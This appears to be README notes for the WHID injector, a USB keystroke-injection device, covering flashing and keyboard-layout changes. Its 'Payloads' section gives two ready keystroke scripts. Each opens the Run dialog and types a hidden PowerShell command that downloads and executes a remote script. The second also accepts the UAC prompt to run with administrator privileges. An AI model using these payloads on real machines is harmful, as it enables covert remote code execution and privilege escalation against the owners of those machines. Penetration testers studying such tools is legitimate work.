## Build instructions
> **Notes:**
> - This has only been tested with the Arduino IDE 2.3.2
> - Only flashing the file at [ESPloitV2_whid/source/Arduino_32u4_Code/Arduino_32u4_Code.ino](https://github.com/whid-injector/WHID/blob/master/ESPloitV2_whid/source/Arduino_32u4_Code/Arduino_32u4_Code.ino) is relevant for the keyboard layout.
> - For flashing [ESPloitV2_whid/source/ESP_Code](https://github.com/whid-injector/WHID/tree/master/ESPloitV2_whid/source/ESP_Code),
> [ESPloitV2_whid/flashing/esp8266Programmer/esp8266Programmer.ino](https://github.com/whid-injector/WHID/blob/master/ESPloitV2_whid/flashing/esp8266Programmer/esp8266Programmer.ino) has
> to be flashed first, and after that `Arduino_32u4_Code.ino` again

See installation, build and usage instructions at [github.com/whid-injector/WHID/wiki#main-requirements](https://github.com/whid-injector/WHID/wiki#main-requirements)




## Change Keyboard layout

If the keyboard is available at [github.com/whid-injector/WHID/wiki/Keyboards-Layout](https://github.com/whid-injector/WHID/wiki/Keyboards-Layout), use those instructions.

If not available, you can modify the file `Keyboard/src/KeyboardLayout_en_US.cpp` ([`Keyboard` library](https://github.com/arduino-libraries/Keyboard), usually found somewhere at around `%localAppData%/Arduino15/libraries/Keyboard` on Windows) based on your needs. \
An example for that is the file [KeyboardLayout_en_US.cpp](/files/KeyboardLayout_en_US.cpp) for the Swiss-German keyboard layout



## Payloads

Use something like the following to execute a powershell script from an url (replace `URL` accordingly)
```shell
Press:131+114 
Print:powershell -w h "IEX(iwr('URL'))"
Press:176
Press:176
Press:176
Press:176
Press:176
```

> **Note**
> `131+114` here stands for the `WIN`+`r` key combo, and `176` for  `ENTER` ([syntax](https://github.com/whid-injector/WHID/wiki/WHID-Software-SCRIPTING-SYNTAX)) \
> See [github.com/whid-injector/WHID#how-to-start-newbies-edition](https://github.com/whid-injector/WHID?tab=readme-ov-file#how-to-start-newbies-edition) for general usage of the WHID-injector

Execution with Administrator privileges
```shell
Press:131+114
Print:powershell -w h "IEX(iwr('url'))"
Press:128+129+176
Press:216
Press:176
Press:216
Press:176
Press:216
Press:176
Press:216
Press:176
Press:216
Press:176
```
(`128+129+176` stands for `CTRL`+`SHIFT`+`ENTER` and `216` for `ArrowLeft`)